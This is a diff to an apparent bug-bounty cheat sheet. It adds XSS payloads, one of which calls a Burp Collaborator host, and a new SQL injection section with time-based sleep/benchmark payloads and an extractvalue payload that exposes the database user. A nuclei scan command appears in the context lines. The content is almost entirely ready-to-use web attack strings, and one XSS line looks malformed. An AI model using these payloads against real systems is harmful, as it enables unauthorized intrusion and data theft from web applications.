@@ -264,8 +264,17 @@ nuclei -u https://targets.com:8858 -t /root/nuclei-template/
 • <IMG SRC="javascript:alert('XSS');">
 • <BASE HREF="javascript:alert('XSS');//">
 • /</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
+• <Svg One OneLoad=alert(1)>
+• ["');alert('CYBERTIX');//"]@bug.xss 
+• <img src="http://burp-collobrator">
 ```
-
+#### SQL Injection
+```bash
+• benchmark%281000000000%2Cmd5%281%29%29--
+email=test@gmail.com'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
+• ' AND extractvalue(rand(),concat(0x3a,(SELECT user()))) #
+• 
+```
 - Bash One liners and More.
 
 
